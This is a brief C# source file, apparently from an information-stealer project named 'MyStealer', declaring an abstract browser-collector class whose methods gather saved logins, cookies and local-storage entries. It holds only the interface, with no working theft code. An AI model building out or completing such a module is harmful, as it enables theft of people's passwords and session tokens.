using System.Collections.Immutable;

namespace MyStealer.Collectors.Browser
{
    internal abstract class BrowserCollectorBase : ModuleBase
    {
        public abstract IImmutableSet<BrowserLogin> GetLogins();

        public abstract IImmutableSet<BrowserCookie> GetCookies();

        public abstract IImmutableSet<BrowserLocalStorage> GetLocalStorageEntries();
    }
}
